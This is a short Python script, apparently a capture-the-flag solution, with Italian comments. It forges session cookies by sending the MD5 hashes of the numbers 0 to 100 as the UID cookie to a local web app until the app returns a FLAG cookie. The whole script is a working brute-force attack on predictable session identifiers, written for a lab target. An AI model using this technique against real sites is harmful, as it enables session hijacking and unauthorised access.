import hashlib
import requests

# Configura IP e porta della web app
ip = "127.0.0.1"
port = "8080"
url = f"http://{ip}:{port}/"

# Proviamo numeri da 0 a 100
for i in range(101):
    # Calcola MD5 del numero
    uid_md5 = hashlib.md5(str(i).encode()).hexdigest()
    
    # Invia richiesta con il cookie UID impostato
    cookies = {'UID': uid_md5}
    response = requests.get(url, cookies=cookies)
    
    # Controlla se la risposta contiene il cookie FLAG
    if 'FLAG' in response.cookies:
        flag = response.cookies['FLAG']
        print(f"Numero corretto: {i}")
        print(f"Cookie FLAG (URL encoded): {flag}")
        break
